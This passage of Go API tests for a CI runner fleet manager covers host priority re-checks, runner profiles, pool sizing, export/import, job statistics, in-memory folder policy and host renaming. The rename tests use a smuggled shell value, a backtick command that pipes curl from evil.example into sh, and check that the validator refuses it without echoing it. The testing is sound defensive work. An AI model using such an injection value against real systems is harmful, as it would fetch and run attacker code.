	if stored.PriorityOverride != nil {
		t.Fatalf("a patch that named no priority moved the pin: %+v", stored.PriorityOverride)
	}
}

// Re-check settles the card now. The specs are re-measured by every heartbeat,
// so the endpoint's only act is the frame and the pass; what it answers is the
// host with the priority, and the audit row says who asked.
func TestRecheckingAHostsPriorityAnswersItAndAuditsThePress(t *testing.T) {
	h := newHarness(t)
	host := specdHost(t, h, "vm-1")
	operator, _ := h.user("operator", store.RoleOperator)

	resp := h.do(request{method: http.MethodPost, path: "/api/v1/hosts/" + host.ID + "/priority-check",
		cookie: h.session(operator)})
	resp.mustStatus(t, http.StatusOK, "re-check the priority")
	var got hostResponse
	resp.into(t, &got)
	if got.Priority == 0 {
		t.Fatalf("the re-check answered a priority of 0")
	}
	if row := lastAudit(t, h, "host.priority_checked"); row == nil || row.TargetID != host.ID {
		t.Errorf("no host.priority_checked audit row was written: %+v", row)
	}

	viewer, _ := h.user("viewer", store.RoleViewer)
	if r := h.do(request{method: http.MethodPost, path: "/api/v1/hosts/" + host.ID + "/priority-check", cookie: h.session(viewer)}); r.status != http.StatusForbidden {
		t.Errorf("a viewer re-checked the priority: %d", r.status)
	}
	if r := h.do(request{method: http.MethodPost, path: "/api/v1/hosts/host_missing/priority-check", cookie: h.session(operator)}); r.status != http.StatusNotFound {
		t.Errorf("a stale id read %d, want 404", r.status)
	}
}

package api

import (
	"encoding/json"
	"net/http"
	"net/url"
	"strings"
	"testing"
	"time"

	"github.com/eyupio/zoomies/internal/store"
)

// measuredHost is a host whose agent has said what machine it is: 12 CPUs and
// 32 GB, which leave 11.4 CPUs and 31130 MB once the floors under the reserve
// are held back.
func (h *harness) measuredHost(name string) *store.Host {
	h.t.Helper()
	host := h.host(name)
	host.CPUs, host.MemoryMB = 12, 32768
	host.DiskTotalMB, host.DiskFreeMB = 500*1024, 400*1024
	if err := h.st.UpdateHost(h.ctx, host); err != nil {
		h.t.Fatalf("UpdateHost: %v", err)
	}
	return host
}

// An operator can say how big a runner is on a host, the answer carries the
// slots it gives and each figure's source, and saving a capacity afterwards
// leaves the profile where it was.
func TestAnOperatorCanSetAHostsRunnerProfile(t *testing.T) {
	h := newHarness(t)
	host := h.measuredHost("big")
	operator, _ := h.user("operator", store.RoleOperator)
	cookie := h.session(operator)

	set := h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + host.ID, cookie: cookie,
		body: map[string]any{"capacity": 8, "runner_profile": map[string]any{
			"minimum":  map[string]any{"cpus": 1},
			"standard": map[string]any{"cpus": 3, "memory_mb": 8192, "burst_max_cpus": 6, "burst_max_memory_mb": 12288},
		}}})
	set.mustStatus(t, http.StatusOK, "set the runner profile")
	var view hostResponse
	set.into(t, &view)
	if view.RunnerProfile == nil || view.RunnerProfile.Standard.CPUs != 3 || view.RunnerProfile.Minimum.CPUs != 1 {
		t.Fatalf("the response does not carry the profile that was set: %+v", view.RunnerProfile)
	}
	if view.Slots != 3 || view.EffectiveCapacity != 3 || view.Capacity != 8 || view.SlotsLimitedBy != "cpu" {
		t.Errorf("slots = %d (effective %d) of capacity %d limited by %q, want 3 of 8 limited by cpu: 11.4 CPUs hold three of 3",
			view.Slots, view.EffectiveCapacity, view.Capacity, view.SlotsLimitedBy)
	}
	if got := view.EffectiveProfile.Standard; got.CPUsSource != "host" || got.BurstMaxCPUs != 6 || got.BurstMaxCPUsSource != "host" {
		t.Errorf("the effective standard does not say it came from the host: %+v", got)
	}
	if got := view.EffectiveProfile.Standard; got.BurstMaxMemoryMB != 12288 || got.BurstMaxMemoryMBSource != "host" {
		t.Errorf("the effective memory ceiling does not say it came from the host: %+v", got)
	}
	if got := view.EffectiveProfile.Minimum; got.CPUs != 1 || got.CPUsSource != "host" {
		t.Errorf("the effective minimum = %+v", got)
	}

	stored, err := h.st.GetHost(h.ctx, host.ID)
	if err != nil {
		t.Fatal(err)
	}
	if stored.RunnerProfile.Standard.MemoryMB != 8192 {
		t.Fatalf("the stored host does not carry the profile: %+v", stored.RunnerProfile)
	}

	// Every field is independent: a capacity alone leaves the profile, and an
	// unprofiled request cannot clear it by omission.
	other := h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + host.ID, cookie: cookie,
		body: map[string]any{"capacity": 6}})
	other.mustStatus(t, http.StatusOK, "set capacity alone")
	var after hostResponse
	other.into(t, &after)
	if after.RunnerProfile == nil || after.RunnerProfile.Standard.CPUs != 3 || after.Capacity != 6 {
		t.Errorf("changing the capacity changed the profile: %+v", after.RunnerProfile)
	}

	// An empty object clears it, and the host follows the fleet again.
	clear := h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + host.ID, cookie: cookie,
		body: map[string]any{"runner_profile": map[string]any{}}})
	clear.mustStatus(t, http.StatusOK, "clear the runner profile")
	var cleared hostResponse
	clear.into(t, &cleared)
	if cleared.RunnerProfile != nil || cleared.Slots != 6 || cleared.EffectiveProfile.Standard.CPUsSource != "global" {
		t.Errorf("an empty profile did not clear it: %+v, %d slots, standard from %q",
			cleared.RunnerProfile, cleared.Slots, cleared.EffectiveProfile.Standard.CPUsSource)
	}

	// A viewer may read the profile and may not write it.
	_, viewer := h.user("viewer", store.RoleViewer)
	h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + host.ID, cookie: viewer,
		body: map[string]any{"runner_profile": map[string]any{"standard": map[string]any{"cpus": 2}}}}).
		mustStatus(t, http.StatusForbidden, "a viewer writing a profile")
}

// A profile the machine could never honour, or that contradicts itself, is
// refused with the field and the reason, and nothing is written.
func TestARunnerProfileTheHostCannotHonourIsRefused(t *testing.T) {
	h := newHarness(t)
	measured := h.measuredHost("big")
	silent := h.host("old") // an agent too old to say what machine it is
	operator, _ := h.user("operator", store.RoleOperator)
	cookie := h.session(operator)

	patch := func(host *store.Host, profile map[string]any) *response {
		return h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + host.ID, cookie: cookie,
			body: map[string]any{"runner_profile": profile}})
	}
	for _, tc := range []struct {
		name    string
		profile map[string]any
		field   string
		reason  string
	}{
		{"a negative size", map[string]any{"standard": map[string]any{"cpus": -1}}, "runner_profile.standard.cpus", "cannot be negative"},
		{"a runner too small to run", map[string]any{"standard": map[string]any{"cpus": 0.1}}, "runner_profile.standard.cpus", "a quarter of a core"},
		{"memory too small to run", map[string]any{"minimum": map[string]any{"memory_mb": 100}}, "runner_profile.minimum.memory_mb", "512 MB"},
		{"a minimum above the standard", map[string]any{"minimum": map[string]any{"cpus": 4}, "standard": map[string]any{"cpus": 2}}, "runner_profile.minimum.cpus", "is above the standard size"},
		{"a memory minimum above the standard", map[string]any{"minimum": map[string]any{"memory_mb": 8192}, "standard": map[string]any{"memory_mb": 4096}}, "runner_profile.minimum.memory_mb", "is above the standard size"},
		{"a ceiling below the standard", map[string]any{"standard": map[string]any{"cpus": 4, "burst_max_cpus": 2}}, "runner_profile.standard.burst_max_cpus", "at least the standard"},
		// The memory ceiling is the most a runner may hold, so under its own share it
		// would ask for memory to be taken back, which the valve never does.
		{"a memory ceiling below the standard", map[string]any{"standard": map[string]any{"memory_mb": 8192, "burst_max_memory_mb": 4096}}, "runner_profile.standard.burst_max_memory_mb", "at least the standard"},
		{"a memory ceiling too small to run", map[string]any{"standard": map[string]any{"burst_max_memory_mb": 100}}, "runner_profile.standard.burst_max_memory_mb", "512 MB"},
		{"a negative memory ceiling", map[string]any{"standard": map[string]any{"burst_max_memory_mb": -1}}, "runner_profile.standard.burst_max_memory_mb", "cannot be negative"},
		{"a standard larger than the machine", map[string]any{"standard": map[string]any{"cpus": 20}}, "runner_profile.standard.cpus", "could never run a single runner here"},
		{"a memory standard larger than the machine", map[string]any{"standard": map[string]any{"memory_mb": 65536}}, "runner_profile.standard.memory_mb", "could never run a single runner here"},
		{"a minimum larger than the machine", map[string]any{"minimum": map[string]any{"cpus": 12}}, "runner_profile.minimum.cpus", "more than it can give a runner"},
		// The host's say over in-memory folders: a ceiling below the floor leaves no
		// folder a checkout fits in, and a host that keeps them off has nothing to
		// cap, so saying both is a contradiction rather than caution.
		{"a negative folder ceiling", map[string]any{"tmpfs": map[string]any{"max_mb": -1}}, "runner_profile.tmpfs.max_mb", "cannot be negative"},
		{"a folder ceiling below the floor", map[string]any{"tmpfs": map[string]any{"max_mb": 32}}, "runner_profile.tmpfs.max_mb", "below 64 MB"},
		{"folders off and capped together", map[string]any{"tmpfs": map[string]any{"disabled": true, "max_mb": 1024}}, "runner_profile.tmpfs.max_mb", "no folder to put a ceiling on"},
		// The sizes a folder is asked for here: the same floor, and nothing to size
		// on a host that falls back to disk.
		{"a negative folder size", map[string]any{"tmpfs": map[string]any{"work_mb": -1}}, "runner_profile.tmpfs.work_mb", "cannot be negative"},
		{"a folder size below the floor", map[string]any{"tmpfs": map[string]any{"daemon_mb": 20}}, "runner_profile.tmpfs.daemon_mb", "below 64 MB"},
		{"a folder size on a host that falls back to disk", map[string]any{"tmpfs": map[string]any{"disabled": true, "tmp_mb": 2048}}, "runner_profile.tmpfs.tmp_mb", "no folder to size"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			resp := patch(measured, tc.profile)
			resp.mustStatus(t, http.StatusUnprocessableEntity, tc.name)
			if body := string(resp.body); !strings.Contains(body, tc.field) || !strings.Contains(body, tc.reason) {
				t.Fatalf("the refusal does not name %s and say %q: %s", tc.field, tc.reason, body)
			}
		})
	}
	if stored, _ := h.st.GetHost(h.ctx, measured.ID); stored.RunnerProfile.Set() {
		t.Fatalf("a refused profile was written anyway: %+v", stored.RunnerProfile)
	}

	// A host that has measured nothing has nothing to compare a size with, so a
	// sane profile is saved and used once it reports.
	patch(silent, map[string]any{"standard": map[string]any{"cpus": 64}}).mustStatus(t, http.StatusOK, "a profile on an unmeasured host")
}

// A host's profile and a pool's size are two halves of one sentence, edited on
// different pages. An edit that takes away the last host a pool could run on is
// refused, with the limit named, until the operator says they meant it.
func TestAProfileThatWouldStrandAPoolIsRefusedUnlessConfirmed(t *testing.T) {
	h := newHarness(t)
	host := h.measuredHost("only")
	pool := h.pool(h.installation(), "small")
	pool.Resources = store.Resources{CPUs: 2, MemoryMB: 2048}
	if err := h.st.UpdatePool(h.ctx, pool); err != nil {
		t.Fatal(err)
	}
	operator, _ := h.user("operator", store.RoleOperator)
	cookie := h.session(operator)
	body := map[string]any{"runner_profile": map[string]any{"minimum": map[string]any{"cpus": 3}}}

	refused := h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + host.ID, cookie: cookie, body: body})
	refused.mustStatus(t, http.StatusConflict, "a minimum above the only pool's size")
	for _, want := range []string{"minimum runner size is 3 CPU", "above the 2 CPU"} {
		if !strings.Contains(string(refused.body), want) {
			t.Errorf("the refusal does not say %q: %s", want, refused.body)
		}
	}
	if stored, _ := h.st.GetHost(h.ctx, host.ID); stored.RunnerProfile.Set() {
		t.Fatalf("a refused edit was written: %+v", stored.RunnerProfile)
	}

	h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + host.ID + "?confirm=true", cookie: cookie, body: body}).
		mustStatus(t, http.StatusOK, "the same edit, confirmed")
	if stored, _ := h.st.GetHost(h.ctx, host.ID); stored.RunnerProfile.Minimum.CPUs != 3 {
		t.Fatalf("a confirmed edit was not written: %+v", stored.RunnerProfile)
	}
}

// A throttle was decided against the sizes the host had; answering it with a
// different size is the operator responding, so the rung is lifted with it.
func TestChangingAHostsRunnerProfileLiftsItsThrottle(t *testing.T) {
	h := newHarness(t)
	host := h.measuredHost("busy")
	if err := h.st.SetHostThrottle(h.ctx, host.ID, store.HostThrottle{Level: 1, Reason: "CPU stayed above 85%"}, 0); err != nil {
		t.Fatal(err)
	}
	operator, _ := h.user("operator", store.RoleOperator)
	cookie := h.session(operator)
	profile := map[string]any{"runner_profile": map[string]any{"standard": map[string]any{"cpus": 3}}}

	resp := h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + host.ID, cookie: cookie, body: profile})
	resp.mustStatus(t, http.StatusOK, "a new profile on a throttled host")
	var view hostResponse
	resp.into(t, &view)
	if view.Throttle != nil {
		t.Fatalf("the throttle stood after the profile changed: %+v", view.Throttle)
	}

	// Repeating the same profile is not an answer to anything.
	if err := h.st.SetHostThrottle(h.ctx, host.ID, store.HostThrottle{Level: 1, Reason: "again"}, 0); err != nil {
		t.Fatal(err)
	}
	again := h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + host.ID, cookie: cookie, body: profile})
	again.mustStatus(t, http.StatusOK, "the same profile again")
	var same hostResponse
	again.into(t, &same)
	if same.Throttle == nil {
		t.Fatal("repeating the profile the host already had lifted the throttle")
	}
}

// A pool takes its size from the host or states one. Both at once is a setting
// that looks like it does something and does not.
func TestAPoolCanTakeItsSizeFromItsHostAndNotAlsoStateOne(t *testing.T) {
	h := newHarness(t)
	inst := h.installation()
	operator, _ := h.user("operator", store.RoleOperator)
	cookie := h.session(operator)

	create := h.do(request{method: http.MethodPost, path: "/api/v1/pools", cookie: cookie, body: map[string]any{
		"name": "sized-by-host", "installation_id": inst.ID, "labels": []string{"sized"},
		"backend": "docker", "image": "ghcr.io/eyupio/zoomies-runner:test", "max_runners": 3,
		"size_from_profile": true,
	}})
	create.mustStatus(t, http.StatusCreated, "create a pool sized by its host")
	var pool struct {
		ID              string `json:"id"`
		Sizing          string `json:"sizing"`
		SizeFromProfile bool   `json:"size_from_profile"`
		FleetStandard   *struct {
			CPUs     float64 `json:"cpus"`
			MemoryMB int64   `json:"memory_mb"`
		} `json:"fleet_standard"`
	}
	create.into(t, &pool)
	if pool.Sizing != "profile" || !pool.SizeFromProfile {
		t.Fatalf("the pool reads as %q, from profile %v", pool.Sizing, pool.SizeFromProfile)
	}
	if pool.FleetStandard == nil || pool.FleetStandard.CPUs != 2 || pool.FleetStandard.MemoryMB != 4096 {
		t.Fatalf("the pool does not say what a host with no standard gives it: %+v", pool.FleetStandard)
	}

	both := h.do(request{method: http.MethodPatch, path: "/api/v1/pools/" + pool.ID, cookie: cookie,
		body: map[string]any{"resources": map[string]any{"cpus": 2, "memory_mb": 2048}}})
	both.mustStatus(t, http.StatusUnprocessableEntity, "a size on a pool that takes it from the host")
	if body := string(both.body); !strings.Contains(body, "size_from_profile") || !strings.Contains(body, "cannot also state one") {
		t.Errorf("the refusal does not say what conflicts: %s", body)
	}

	// Moving to a stated size takes both halves of the change at once -- and,
	// as for any pool, the elasticity a new pool is given is for a size the host
	// decides, so a stated size turns it off.
	h.do(request{method: http.MethodPatch, path: "/api/v1/pools/" + pool.ID, cookie: cookie,
		body: map[string]any{"size_from_profile": false, "cpu_burst": map[string]any{"mode": "off"},
			"resources": map[string]any{"cpus": 2, "memory_mb": 2048}}}).
		mustStatus(t, http.StatusOK, "move the pool to a stated size")
	got, err := h.st.GetPool(h.ctx, pool.ID)
	if err != nil {
		t.Fatal(err)
	}
	if got.SizeFromProfile || got.Resources.CPUs != 2 {
		t.Fatalf("the pool after the move = from profile %v, %+v", got.SizeFromProfile, got.Resources)
	}
}

// A pool exported with its size taken from the host and imported without that
// would be sized by a slot's share instead -- a different size on every
// machine the other instance has.
func TestAProfilePoolSurvivesAnExportAndImport(t *testing.T) {
	h := newHarness(t)
	inst := h.installation()
	pool := h.pool(inst, "sized")
	pool.SizeFromProfile = true
	if err := h.st.UpdatePool(h.ctx, pool); err != nil {
		t.Fatal(err)
	}
	operator, _ := h.user("operator", store.RoleOperator)
	cookie := h.session(operator)

	export := h.do(request{method: http.MethodGet, path: "/api/v1/pools/export", cookie: cookie})
	export.mustStatus(t, http.StatusOK, "export")
	if !strings.Contains(string(export.body), `"size_from_profile": true`) {
		t.Fatalf("the export does not carry the choice: %s", export.body)
	}

	// The document planned against an instance where the pool is sized the
	// ordinary way says the field would change.
	pool.SizeFromProfile = false
	if err := h.st.UpdatePool(h.ctx, pool); err != nil {
		t.Fatal(err)
	}
	plan := h.do(request{method: http.MethodPost, path: "/api/v1/pools/import", cookie: cookie,
		body: map[string]any{"document": string(export.body), "dry_run": true}})
	plan.mustStatus(t, http.StatusOK, "plan the import")
	var out struct {
		Changes []struct {
			Pool   string `json:"pool"`
			Action string `json:"action"`
			Fields []struct {
				Field    string `json:"field"`
				Incoming any    `json:"incoming"`
			} `json:"fields"`
		} `json:"changes"`
	}
	if err := json.Unmarshal(plan.body, &out); err != nil {
		t.Fatalf("%v: %s", err, plan.body)
	}
	found := false
	for _, c := range out.Changes {
		for _, f := range c.Fields {
			found = found || (f.Field == "size_from_profile" && f.Incoming == true)
		}
	}
	if !found {
		t.Fatalf("the plan does not move size_from_profile: %s", plan.body)
	}
}

// Jobs can be grouped by the size of the runner they ran on, and listed by it,
// in the words an operator would say it.
func TestJobStatsGroupBySizeAndTheSizeFilterOpensARow(t *testing.T) {
	h := newHarness(t)
	pool := h.pool(h.installation(), "linux")
	_, cookie := h.user("viewer", store.RoleViewer)
	now := time.Now()
	big := h.releaseJobs(pool, "", 3, 1_000, now.Add(-2*24*time.Hour))
	small := h.releaseJobs(pool, "", 2, 2_000, now.Add(-2*24*time.Hour))
	h.releaseJobs(pool, "", 1, 3_000, now.Add(-2*24*time.Hour)) // never recorded
	for _, j := range big {
		if _, err := h.st.StampJobGranted(h.ctx, j.ID, 3, 8192, store.AllocationFromProfile); err != nil {
			t.Fatal(err)
		}
	}
	for _, j := range small {
		if _, err := h.st.StampJobGranted(h.ctx, j.ID, 1.5, 4096, store.AllocationFromProfile); err != nil {
			t.Fatal(err)
		}
	}

	resp := h.do(request{method: http.MethodGet, path: "/api/v1/jobs/stats?group_by=size", cookie: cookie})
	resp.mustStatus(t, http.StatusOK, "job statistics by size")
	var got struct {
		Groups []struct {
			Keys  map[string]string `json:"keys"`
			Count int               `json:"count"`
		} `json:"groups"`
	}
	if err := json.Unmarshal(resp.body, &got); err != nil {
		t.Fatalf("%v: %s", err, resp.body)
	}
	counts := map[string]int{}
	for _, g := range got.Groups {
		counts[g.Keys["size"]] = g.Count
	}
	if counts["3 CPU / 8 GB"] != 3 || counts["1.5 CPU / 4 GB"] != 2 || counts["unknown"] != 1 {
		t.Fatalf("groups = %v, want 3 on 3 CPU / 8 GB, 2 on 1.5 CPU / 4 GB and 1 unknown", counts)
	}

	list := h.do(request{method: http.MethodGet, path: "/api/v1/jobs?size=" + url.QueryEscape("1.5 CPU / 4 GB"), cookie: cookie})
	list.mustStatus(t, http.StatusOK, "jobs of one size")
	var listed struct {
		Items []struct {
			GrantedCPUs     float64 `json:"granted_cpus"`
			GrantedMemoryMB int64   `json:"granted_memory_mb"`
			GrantedSource   string  `json:"granted_source"`
		} `json:"items"`
		Total int `json:"total"`
	}
	if err := json.Unmarshal(list.body, &listed); err != nil {
		t.Fatalf("%v: %s", err, list.body)
	}
	if listed.Total != 2 || len(listed.Items) != 2 || listed.Items[0].GrantedCPUs != 1.5 || listed.Items[0].GrantedSource != "profile" {
		t.Fatalf("the size filter returned %+v, want the two small jobs with their size on them", listed)
	}
	unknown := h.do(request{method: http.MethodGet, path: "/api/v1/jobs?size=unknown", cookie: cookie})
	unknown.mustStatus(t, http.StatusOK, "jobs with no recorded size")
	var unlisted struct{ Total int }
	if err := json.Unmarshal(unknown.body, &unlisted); err != nil || unlisted.Total != 1 {
		t.Fatalf("size=unknown listed %d jobs (%v), want the one never recorded", unlisted.Total, err)
	}
}

// A host's say over pools' in-memory folders is stored with its runner profile,
// comes back in the host's view, and is left alone by an edit that names only a
// capacity -- the policy is the operator's, and a heartbeat never writes it.
func TestAnOperatorCanKeepInMemoryFoldersOffAHostOrCapThem(t *testing.T) {
	h := newHarness(t)
	host := h.measuredHost("tight")
	operator, _ := h.user("operator", store.RoleOperator)
	cookie := h.session(operator)
	patch := func(body map[string]any) hostResponse {
		t.Helper()
		resp := h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + host.ID, cookie: cookie, body: body})
		resp.mustStatus(t, http.StatusOK, "patch")
		var view hostResponse
		resp.into(t, &view)
		return view
	}

	view := patch(map[string]any{"runner_profile": map[string]any{"tmpfs": map[string]any{"max_mb": 2048}}})
	if view.RunnerProfile == nil || view.RunnerProfile.Tmpfs != (store.HostTmpfs{MaxMB: 2048}) {
		t.Fatalf("the response does not carry the ceiling: %+v", view.RunnerProfile)
	}
	if stored, _ := h.st.GetHost(h.ctx, host.ID); stored.RunnerProfile.Tmpfs.MaxMB != 2048 {
		t.Fatalf("the stored host does not carry the ceiling: %+v", stored.RunnerProfile)
	}

	// A capacity alone leaves the policy where it was.
	patch(map[string]any{"capacity": 3})
	if stored, _ := h.st.GetHost(h.ctx, host.ID); stored.RunnerProfile.Tmpfs.MaxMB != 2048 {
		t.Fatalf("an unrelated edit changed the policy: %+v", stored.RunnerProfile)
	}

	// Replacing the profile replaces the policy too, which is how it is turned
	// off here and how it is handed back.
	patch(map[string]any{"runner_profile": map[string]any{"tmpfs": map[string]any{"disabled": true}}})
	if stored, _ := h.st.GetHost(h.ctx, host.ID); !stored.RunnerProfile.Tmpfs.Disabled || stored.RunnerProfile.Tmpfs.MaxMB != 0 {
		t.Fatalf("the host did not keep the folders off: %+v", stored.RunnerProfile)
	}
	patch(map[string]any{"runner_profile": map[string]any{}})
	if stored, _ := h.st.GetHost(h.ctx, host.ID); stored.RunnerProfile.Set() {
		t.Fatalf("clearing the profile left a policy behind: %+v", stored.RunnerProfile)
	}
}

package api

import (
	"net/http"
	"strings"
	"testing"

	"github.com/eyupio/zoomies/internal/naming"
	"github.com/eyupio/zoomies/internal/store"
)

// The name a host joined under comes from the agent's configuration, or from a
// container ID, and the operator is the one who has to read it every day.
func TestAnOperatorCanRenameAHost(t *testing.T) {
	h := newHarness(t)
	host := h.host("7096d9a9b798")
	operator, _ := h.user("operator", store.RoleOperator)

	res := h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + host.ID,
		cookie: h.session(operator), body: map[string]any{"name": "  build-box  "}})
	res.mustStatus(t, http.StatusOK, "rename the host")

	var view hostResponse
	res.into(t, &view)
	if view.Name != "build-box" {
		t.Fatalf("name = %q, want the trimmed one", view.Name)
	}
	stored, err := h.st.GetHost(h.ctx, host.ID)
	if err != nil {
		t.Fatalf("GetHost: %v", err)
	}
	if stored.Name != "build-box" {
		t.Fatalf("stored name = %q; the rename lived in the response alone", stored.Name)
	}

	// A request that names something else leaves the name where it was.
	h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + host.ID,
		cookie: h.session(operator), body: map[string]any{"capacity": 3}}).
		mustStatus(t, http.StatusOK, "change the capacity")
	if stored, _ := h.st.GetHost(h.ctx, host.ID); stored.Name != "build-box" {
		t.Fatalf("changing the capacity cleared the name: %q", stored.Name)
	}
}

// Two hosts called the same thing could not be told apart in a pool's reasons,
// and an agent joining by name would find the wrong row.
func TestAHostCannotBeRenamedToAnotherHostsName(t *testing.T) {
	h := newHarness(t)
	h.host("taken")
	host := h.host("vm-2")
	operator, _ := h.user("operator", store.RoleOperator)

	for name, body := range map[string]string{
		"taken":      "taken",
		"empty":      "   ",
		"too long":   strings.Repeat("a", naming.MaxHostNameLength+1),
		"line break": "two\nlines",
		"backticks":  "a`curl evil.example|sh`b",
	} {
		res := h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + host.ID,
			cookie: h.session(operator), body: map[string]any{"name": body}})
		res.mustStatus(t, http.StatusUnprocessableEntity, "rename to "+name)
	}
	if stored, _ := h.st.GetHost(h.ctx, host.ID); stored.Name != "vm-2" {
		t.Fatalf("name = %q after refused renames, want it unchanged", stored.Name)
	}

	// Saving the name it already has is not a clash with itself.
	h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + host.ID,
		cookie: h.session(operator), body: map[string]any{"name": "vm-2"}}).
		mustStatus(t, http.StatusOK, "keep the same name")
}

// An agent chooses its name at join, and an operator may change it afterwards;
// the two doors share one rule, so a name the join refuses cannot be put on a
// host by renaming it. The refusal says what is wrong without repeating the
// name, because it is the text nobody has vouched for.
func TestARenameThatCouldPassForACommandIsRefusedAndSaysWhy(t *testing.T) {
	h := newHarness(t)
	host := h.host("vm-2")
	operator, _ := h.user("operator", store.RoleOperator)

	res := h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + host.ID,
		cookie: h.session(operator), body: map[string]any{"name": "a`curl evil.example|sh`b"}})
	res.mustStatus(t, http.StatusUnprocessableEntity, "rename to a name with backticks")
	if body := string(res.body); !strings.Contains(body, "backtick") || strings.Contains(body, "evil.example") {
		t.Errorf("the refusal should name the rule and not repeat the name: %s", body)
	}
	if stored, _ := h.st.GetHost(h.ctx, host.ID); stored.Name != "vm-2" {
		t.Fatalf("name = %q after a refused rename, want it unchanged", stored.Name)
	}

	// A host already stored under such a name can be given a good one: the
	// rule is about the name being set, not the one being replaced.
	legacy := h.host("old`name")
	h.do(request{method: http.MethodPatch, path: "/api/v1/hosts/" + legacy.ID,
		cookie: h.session(operator), body: map[string]any{"name": "tidy-name"}}).
		mustStatus(t, http.StatusOK, "rename a host out of a name that is now refused")
}

package api

import (
	"net/http"
	"strings"
	"testing"

	"github.com/eyupio/zoomies/internal/store"
